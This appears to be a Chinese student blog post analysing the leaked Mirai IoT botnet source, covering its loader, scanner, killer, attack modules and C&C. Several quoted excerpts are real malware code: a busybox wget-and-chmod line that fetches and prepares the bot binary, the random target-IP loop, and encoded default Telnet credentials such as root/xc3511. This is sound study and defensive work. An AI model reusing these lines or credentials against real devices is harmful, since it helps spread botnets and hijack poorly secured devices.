@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>对 Mirai 病毒的初步分析——物联网安全形式严峻 | Asuri Team</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前几天，半个美国的吃瓜群众纷纷表示上不了网了。经过各种调查，发现是一个代号为 Mirai（日语：未来）的病毒感染了物联网设备，形成了一个僵尸网络，最终这个超大型的僵尸网络向美国某 DNS 公司的服务器发起了 DDoS 攻击。Mirai 的 C 语言源码在网上很容易获取到，刚好我最近在上计算机病毒课，于是就下载下来研究了一下，顺便看一下以自己现在的能力可以理解到哪一步。 下载下来之后粗略看了一下，第">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对 Mirai 病毒的初步分析——物联网安全形式严峻">
+<meta property="og:url" content="http://asuri.org/2016/10/26/analytics-about-mirai/index.html">
+<meta property="og:site_name" content="Asuri Team">
+<meta property="og:description" content="前几天，半个美国的吃瓜群众纷纷表示上不了网了。经过各种调查，发现是一个代号为 Mirai（日语：未来）的病毒感染了物联网设备，形成了一个僵尸网络，最终这个超大型的僵尸网络向美国某 DNS 公司的服务器发起了 DDoS 攻击。Mirai 的 C 语言源码在网上很容易获取到，刚好我最近在上计算机病毒课，于是就下载下来研究了一下，顺便看一下以自己现在的能力可以理解到哪一步。 下载下来之后粗略看了一下，第">
+<meta property="og:locale">
+<meta property="article:published_time" content="2016-10-26T04:15:00.000Z">
+<meta property="article:modified_time" content="2023-04-07T12:29:53.466Z">
+<meta property="article:author" content="All Members">
+<meta property="article:tag" content="mirai">
+<meta property="article:tag" content="virus">
+<meta property="article:tag" content="analytics">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <div id="container">
+    
+
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Asuri Team</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/members">Members</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-analytics-about-mirai" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/10/26/analytics-about-mirai/" class="article-date">
+  <time datetime="2016-10-26T04:15:00.000Z" itemprop="datePublished">2016-10-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Develop/">Develop</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      对 Mirai 病毒的初步分析——物联网安全形式严峻
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
+    <div class="article-author-info">
+      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
+      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前几天，半个美国的吃瓜群众纷纷表示上不了网了。经过各种调查，发现是一个代号为 Mirai（日语：未来）的病毒感染了物联网设备，形成了一个僵尸网络，最终这个超大型的僵尸网络向美国某 DNS 公司的服务器发起了 DDoS 攻击。Mirai 的 C 语言源码在网上很容易获取到，刚好我最近在上计算机病毒课，于是就下载下来研究了一下，顺便看一下以自己现在的能力可以理解到哪一步。</p>
+<p>下载下来之后粗略看了一下，第一感觉就是作者的代码风格真的是超级好！不光代码格式很赞（虽说大括号放到了下一行），而且变量名、文件名都很有目的性，重要的地方都写了注释或者打了 log，因此分析起来还是相对比较简单的。</p>
+<h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><p>Mirai 源码目录结构是这样的：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Mirai_Source_Code</span><br><span class="line">├─loader           # 加载器</span><br><span class="line">│  ├─bins          # 一部分二进制文件</span><br><span class="line">│  └─src           # 加载器的源码</span><br><span class="line">│      └─headers</span><br><span class="line">└─mirai            # 病毒本体</span><br><span class="line">    ├─bot          # 攻击、扫描器、域名解析等模块</span><br><span class="line">    ├─cnc          # 使用 go 语言写的服务器程序</span><br><span class="line">    └─tools        # 存活状态检测、加解密、下载文件等功能</span><br></pre></td></tr></table></figure>
+
+<h1 id="加载器部分"><a href="#加载器部分" class="headerlink" title="加载器部分"></a>加载器部分</h1><p>接下来我们把目光转向 <code>loader/src/main.c</code> 文件。在 <code>main</code> 函数中有效力的第一句话是调用了 <code>binary_init</code> 函数，在这个函数中尝试加载 <code>loader/bins</code> 下面的程序（本文所有引用的代码，格式均按照我的风格有所调整，但内容均未修改）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (glob(<span class="string">&quot;bins/dlr.*&quot;</span>, GLOB_ERR, <span class="literal">NULL</span>, &amp;pglob) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to load from bins folder!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pglob.gl_pathc; i++) &#123;</span><br><span class="line">    <span class="keyword">char</span> file_name[<span class="number">256</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">binary</span> *<span class="title">bin</span>;</span></span><br><span class="line">    bin_list = <span class="built_in">realloc</span>(bin_list, (bin_list_len + <span class="number">1</span>) * <span class="keyword">sizeof</span> (struct binary *));</span><br><span class="line">    bin_list[bin_list_len] = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span> (struct binary));</span><br><span class="line">    bin = bin_list[bin_list_len++];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(%d/%d) %s is loading...\n&quot;</span>, i + <span class="number">1</span>, pglob.gl_pathc, pglob.gl_pathv[i]);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="built_in">strcpy</span>(file_name, pglob.gl_pathv[i]);</span><br><span class="line">    strtok(file_name, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(bin-&gt;arch, strtok(<span class="literal">NULL</span>, <span class="string">&quot;.&quot;</span>));</span><br><span class="line">    load(bin, pglob.gl_pathv[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实 <code>loader/bins</code> 目录下就是叫 <code>dlr</code> 的程序的各种架构的二进制编译版本。因为本机恰好有 IDA，里面有 Hex-Rays，可以反编译 x86 架构的程序，于是我就从 <code>dlr.x86</code> 文件入手了。打开文件，按下 F5 查看伪代码，发现几乎所有的函数都无法解析，然而汇编我又不熟，所以只能看唯一一个可以解析的函数 <code>sub_804819D</code>。大部分代码都看不懂（其实解析出来的代码只有 61 行），但是里面有这么一段：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sub_8048146(v3, <span class="string">&quot;GET /bins/mirai.x86 HTTP/1.0\r\n\r\n&quot;</span>, i + <span class="number">29</span>) != i + <span class="number">29</span>)</span><br><span class="line">    sub_80480E0(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这是尝试加载一个文件。然而我没能获取到这个文件，因此只能作罢。</p>
+<p>加载完二进制之后，接着创建一个服务器：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, <span class="number">1024</span> * <span class="number">64</span>, <span class="string">&quot;100.200.100.100&quot;</span>, <span class="number">80</span>, <span class="string">&quot;100.200.100.100&quot;</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to initialize server. Aborting\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后可以通过这个服务器进行 tftp/wget 的下载，以及文件读写操作，代码中大量调用了 busybox 的功能，例如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">util_sockprintf(conn-&gt;fd, <span class="string">&quot;/bin/busybox wget http://%s:%d/bins/%s.%s -O - &gt; &quot;</span>FN_BINARY <span class="string">&quot;; /bin/busybox chmod 777 &quot;</span> FN_BINARY <span class="string">&quot;; &quot;</span> TOKEN_QUERY <span class="string">&quot;\r\n&quot;</span>, wrker-&gt;srv-&gt;wget_host_ip, wrker-&gt;srv-&gt;wget_host_port, <span class="string">&quot;mirai&quot;</span>, conn-&gt;info.arch);</span><br></pre></td></tr></table></figure>
+
+<p>所以可见搭载 busybox 的系统是其目标之一。此外这个服务器还有其它的功能，例如建立 Telnet 连接（地址需要手动输入），显示全部连接的状态，这应该是监控病毒状态用的。</p>
+<h1 id="病毒本体部分"><a href="#病毒本体部分" class="headerlink" title="病毒本体部分"></a>病毒本体部分</h1><h2 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a>实用工具</h2><h3 id="badbot-c"><a href="#badbot-c" class="headerlink" title="badbot.c"></a>badbot.c</h3><p>显示指定的 bot 信息，然而里面只有一句 <code>printf</code>，不知道意义何在。</p>
+<h3 id="enc-c"><a href="#enc-c" class="headerlink" title="enc.c"></a>enc.c</h3><p>常用数据类型（<code>string</code>、<code>ip</code>、<code>uint32</code>、<code>uint16</code>、<code>uint8</code>、<code>bool</code>）的加解密。</p>
+<h3 id="nogdb-c"><a href="#nogdb-c" class="headerlink" title="nogdb.c"></a>nogdb.c</h3><p>修改 ELF 文件头，使得其无法在 GDB 中运行。</p>
+<h3 id="scanListen-go"><a href="#scanListen-go" class="headerlink" title="scanListen.go"></a>scanListen.go</h3><p>监视扫描器的扫描记录。</p>
+<h3 id="single-load-c"><a href="#single-load-c" class="headerlink" title="single_load.c"></a>single_load.c</h3><p>加载指定 <code>IP:Port</code> 下面指定的文件，估计是用于运行远程服务器上的病毒。</p>
+<h3 id="wget-c"><a href="#wget-c" class="headerlink" title="wget.c"></a>wget.c</h3><p>用于下载文件。</p>
+<h2 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h2><p>攻击模块的作用是向 DDoS 的目标发起攻击，相关的代码在 <code>mirai/bot/attack*.c</code> 文件中，其中 <code>attack.c</code> 是主入口，里面写了“开始攻击”、“结束攻击”、“攻击选项”等通用的功能；其它的都是分别对应 TCP、UDP 等协议的攻击程序。攻击的选项有好多，例如目标 IP、是否分片、每次发送的长度、是否发送随机数据等。攻击的时候，首先非阻塞地连接目标，然后尝试获取服务器信息，如果获取到了，说明服务器存活，就开始不断发送数据。</p>
+<h2 id="killer-模块"><a href="#killer-模块" class="headerlink" title="killer 模块"></a>killer 模块</h2><p>killer 模块的作用是杀死本机的一些特定服务，例如 ssh、telnet、http，并绑定它们的端口，防止服务重新启动。值得注意的是，扫描服务的时候是通过端口扫描的，即杀死使用 22、23、80 端口的程序，但是如果服务的端口被修改过，就可以幸免遇难。当然，考虑到本机其实是个物联网设备，因此几乎没有人会做这样的修改。</p>
+<h2 id="checksum-c、rand-c、resolve-c"><a href="#checksum-c、rand-c、resolve-c" class="headerlink" title="checksum.c、rand.c、resolve.c"></a>checksum.c、rand.c、resolve.c</h2><p>这些文件虽然更像工具集（在 <code>mirai/tools</code> 目录下），但是是病毒文件需要用到的，因此就跟病毒放到了一块。</p>
+<p><code>checksum.c</code> 可以实现简单的校验功能。</p>
+<p><code>rand.c</code> 可以生成下一个随机数、生成指定长度的随机字符串、生成指定长度的字母串。</p>
+<p><code>resolve.c</code> 可以进行域名解析。</p>
+<h2 id="扩展的-C-函数"><a href="#扩展的-C-函数" class="headerlink" title="扩展的 C 函数"></a>扩展的 C 函数</h2><p>不知道为啥作者会写一个 <code>util.c</code> 进去，里面是各种 C 语言函数的实现，例如 <code>strlen</code>、<code>trncmp</code>、<code>strcmp</code>、<code>strcpy</code>、<code>memcpy</code> 等。</p>
+<h2 id="常量列表"><a href="#常量列表" class="headerlink" title="常量列表"></a>常量列表</h2><p>文件 <code>table.c</code> 里面存了一份常量列表，大概长这样：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">table_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    add_entry(TABLE_CNC_DOMAIN, <span class="string">&quot;\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22&quot;</span>, <span class="number">30</span>);</span><br><span class="line">    add_entry(TABLE_CNC_PORT, <span class="string">&quot;\x22\x35&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    add_entry(TABLE_SCAN_CB_DOMAIN, <span class="string">&quot;\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22&quot;</span>, <span class="number">29</span>);</span><br><span class="line">    add_entry(TABLE_SCAN_CB_PORT, <span class="string">&quot;\x99\xC7&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 下面省略若干内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后面的字符串看不懂怎么办？没关系，我们看到 <code>table.h</code> 就知道了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Attack strings */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_VSE                   29  <span class="comment">/* TSource Engine Query */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_RESOLVER              30  <span class="comment">/* /etc/resolv.conf */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_NSERV                 31  <span class="comment">/* &quot;nameserver &quot; */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_KEEP_ALIVE            32  <span class="comment">/* &quot;Connection: keep-alive&quot; */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_ACCEPT                33  <span class="comment">// &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot; // */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_ACCEPT_LNG            34  <span class="comment">// &quot;Accept-Language: en-US,en;q=0.8&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_CONTENT_TYPE          35  <span class="comment">// &quot;Content-Type: application/x-www-form-urlencoded&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_SET_COOKIE            36  <span class="comment">// &quot;setCookie(&#x27;&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_REFRESH_HDR           37  <span class="comment">// &quot;refresh:&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_LOCATION_HDR          38  <span class="comment">// &quot;location:&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_SET_COOKIE_HDR        39  <span class="comment">// &quot;set-cookie:&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_CONTENT_LENGTH_HDR    40  <span class="comment">// &quot;content-length:&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_TRANSFER_ENCODING_HDR 41  <span class="comment">// &quot;transfer-encoding:&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_CHUNKED               42  <span class="comment">// &quot;chunked&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_KEEP_ALIVE_HDR        43  <span class="comment">// &quot;keep-alive&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_CONNECTION_HDR        44  <span class="comment">// &quot;connection:&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_DOSARREST             45  <span class="comment">// &quot;server: dosarrest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_ATK_CLOUDFLARE_NGINX      46  <span class="comment">// &quot;server: cloudflare-nginx&quot;</span></span></span><br><span class="line"><span class="comment">/* User agent strings */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_HTTP_ONE                  47  <span class="comment">/* &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot; */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_HTTP_TWO                  48  <span class="comment">/* &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot; */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_HTTP_THREE                49  <span class="comment">/* &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot; */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_HTTP_FOUR                 50  <span class="comment">/* &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot; */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_HTTP_FIVE                 51  <span class="comment">/* &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&quot; */</span></span></span><br></pre></td></tr></table></figure>
+
+<p>随便举了一段，注释里面就是解密之后的字符串。</p>
+<h2 id="扫描器模块"><a href="#扫描器模块" class="headerlink" title="扫描器模块"></a>扫描器模块</h2><p>程序会 fork 出一个子进程来扫描。扫描过程发送的请求中，本机端口为随机端口，目标机端口为 23 和 2323，目标 IP 是随机选取的，选取的方法是，先生成一个随机 IP，如果发现这个 IP 是本地回环等没有攻击价值的 IP，就跳过继续生成下一个：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    tmp = rand_next();</span><br><span class="line">    o1 = tmp &amp; <span class="number">0xff</span>;</span><br><span class="line">    o2 = (tmp &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    o3 = (tmp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    o4 = (tmp &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (o1 == <span class="number">127</span> ||                             <span class="comment">// 127.0.0.0/8      - Loopback</span></span><br><span class="line">      (o1 == <span class="number">0</span>) ||                              <span class="comment">// 0.0.0.0/8        - Invalid address space</span></span><br><span class="line">      (o1 == <span class="number">3</span>) ||                              <span class="comment">// 3.0.0.0/8        - General Electric Company</span></span><br><span class="line">      (o1 == <span class="number">15</span> || o1 == <span class="number">16</span>) ||                 <span class="comment">// 15.0.0.0/7       - Hewlett-Packard Company</span></span><br><span class="line">      (o1 == <span class="number">56</span>) ||                             <span class="comment">// 56.0.0.0/8       - US Postal Service</span></span><br><span class="line">      (o1 == <span class="number">10</span>) ||                             <span class="comment">// 10.0.0.0/8       - Internal network</span></span><br><span class="line">      (o1 == <span class="number">192</span> &amp;&amp; o2 == <span class="number">168</span>) ||               <span class="comment">// 192.168.0.0/16   - Internal network</span></span><br><span class="line">      (o1 == <span class="number">172</span> &amp;&amp; o2 &gt;= <span class="number">16</span> &amp;&amp; o2 &lt; <span class="number">32</span>) ||     <span class="comment">// 172.16.0.0/14    - Internal network</span></span><br><span class="line">      (o1 == <span class="number">100</span> &amp;&amp; o2 &gt;= <span class="number">64</span> &amp;&amp; o2 &lt; <span class="number">127</span>) ||    <span class="comment">// 100.64.0.0/10    - IANA NAT reserved</span></span><br><span class="line">      (o1 == <span class="number">169</span> &amp;&amp; o2 &gt; <span class="number">254</span>) ||                <span class="comment">// 169.254.0.0/16   - IANA NAT reserved</span></span><br><span class="line">      (o1 == <span class="number">198</span> &amp;&amp; o2 &gt;= <span class="number">18</span> &amp;&amp; o2 &lt; <span class="number">20</span>) ||     <span class="comment">// 198.18.0.0/15    - IANA Special use</span></span><br><span class="line">      (o1 &gt;= <span class="number">224</span>) ||                            <span class="comment">// 224.*.*.*+       - Multicast</span></span><br><span class="line">      (o1 == <span class="number">6</span> || o1 == <span class="number">7</span> || o1 == <span class="number">11</span> || o1 == <span class="number">21</span> || o1 == <span class="number">22</span> || o1 == <span class="number">26</span> || o1 == <span class="number">28</span> || o1 == <span class="number">29</span> || o1 == <span class="number">30</span> || o1 == <span class="number">33</span> || o1 == <span class="number">55</span> || o1 == <span class="number">214</span> || o1 == <span class="number">215</span>) <span class="comment">// Department of Defense</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>连接成功后，尝试使用各种设备的默认账号和密码登录，程序内置了一份默认账户列表：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set up passwords</span></span><br><span class="line">add_auth_entry(<span class="string">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="string">&quot;\x5A\x41\x11\x17\x13\x13&quot;</span>, <span class="number">10</span>);                     <span class="comment">// root     xc3511</span></span><br><span class="line">add_auth_entry(<span class="string">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="string">&quot;\x54\x4B\x58\x5A\x54&quot;</span>, <span class="number">9</span>);                          <span class="comment">// root     vizxv</span></span><br><span class="line"><span class="comment">// 此处省略若干行</span></span><br><span class="line">add_auth_entry(<span class="string">&quot;\x56\x47\x41\x4A&quot;</span>, <span class="string">&quot;\x56\x47\x41\x4A&quot;</span>, <span class="number">1</span>);                              <span class="comment">// tech     tech</span></span><br><span class="line">add_auth_entry(<span class="string">&quot;\x4F\x4D\x56\x4A\x47\x50&quot;</span>, <span class="string">&quot;\x44\x57\x41\x49\x47\x50&quot;</span>, <span class="number">1</span>);              <span class="comment">// mother   fucker</span></span><br></pre></td></tr></table></figure>
+
+<p>若可以登录，则将该 IP、端口、账号信息发送到 <code>TABLE_SCAN_CB_DOMAIN:TABLE_SCAN_CB_PORT</code> 中。</p>
+<h2 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h2><p>主程序就是 <code>main.c</code> 了，首先反调试、禁止 <code>watchdog</code> 和 <code>/dev/misc</code> 重启设备，然后确保只有一个实例运行（判断 48101 端口是否已被连接），然后隐藏进程名称，fork 出一个子进程并结束自身，子进程继续开启攻击模块、killer 模块、扫描器，最后连接到一个管理后端并监听控制者发起的各种指令。</p>
+<h1 id="管理后端"><a href="#管理后端" class="headerlink" title="管理后端"></a>管理后端</h1><p>这是一个用 Go 语言写的、攻击者本地运行的命令行服务端，可以向已连接到本机的 bot 发送攻击命令。由于此处与病毒原理无关，因此不做过多分析。</p>
+<hr>
+<p>分析了这么久，感觉这个 Mirai 不仅仅是一个病毒，而是一套完整的“控制端+bot+工具集”的解决方案。Mirai 的原作者在论坛中的帖子内容语气狂妄，嘲讽那些尝试反编译 Mirai 的人们：</p>
+<blockquote>
+<p>However, I know every skid and their mama, it’s their wet dream to have something besides qbot.<br>So, I am your senpai, and I will treat you real nice, my hf-chan.<br>Don’t make me laugh please, you made so many mistakes and even confused some different binaries with my. LOL<br>Why are you writing reverse engineer tools? You cannot even correctly reverse in the first place.</p>
+</blockquote>
+<p>作者将此工程发出来的原因是“我已经赚到钱了，你们又逐渐把目光转向了我用来赚钱的物联网设备，所以是时候把我这套方案发出来了”，当然这次的攻击来源也是迄今为止规模最大的、由物联网设备组成的僵尸网络。</p>
+<p>据说此次受影响的大部分物联网设备都将默认密码硬编码到了硬件里，因此无法修补漏洞。Mirai 的发布，迫使大家越来越重视物联网安全。有网友笑称：“以后都不敢开灯了。”只能希望，这种情况不会成为我们的 Mirai（未来）。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2016/10/26/analytics-about-mirai/" data-id="clg6iymp4000iguot4y7nen8f" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/virus/" rel="tag">virus</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/11/06/2016-suctf-writeup/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SUCTF 招新赛 Writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/09/07/2016-tianyi-ctf-final-writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2016 天翼杯信息安全竞赛决赛的一些经历</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+        <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
